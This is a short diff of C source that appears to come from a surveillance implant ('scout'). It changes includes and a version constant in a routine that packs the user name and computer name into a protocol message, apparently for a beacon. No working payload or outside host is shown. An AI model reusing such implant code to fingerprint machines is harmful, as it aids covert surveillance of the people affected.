@@ -8,7 +8,6 @@
 #include "utils.h"
 #include "crypt.h"
 #include "sha1.h"
-#include "base64.h"
 #include "winhttp.h"
 #include "proto.h"
 #include "debug.h"
@@ -24,6 +23,9 @@
 #include "password.h"
 #include "filesystem.h"
 #include "conf.h"
+
+#undef _GLOBAL_VERSION_FUNCTIONS_
+#include "version.h"
 
 #pragma include_alias( "dxtrans.h", "camera.h" )
 #define __IDxtCompositor_INTERFACE_DEFINED__
@@ -599,7 +601,7 @@ LPBYTE ProtoMessageId(LPDWORD dwMsgLen)
 	DWORD dwBuffLen = dwUser + dwComputer + dwSource + sizeof(DWORD);
 	LPBYTE lpBuffer = (LPBYTE)zalloc(dwBuffLen);
 
-	*(LPDWORD)lpBuffer = SCOUT_VERSION;
+	*(LPDWORD)lpBuffer = BUILD_VERSION;
 
 	memcpy(lpBuffer + dwOffset, lpUserNamePascal, dwUser);
 	dwOffset += dwUser;
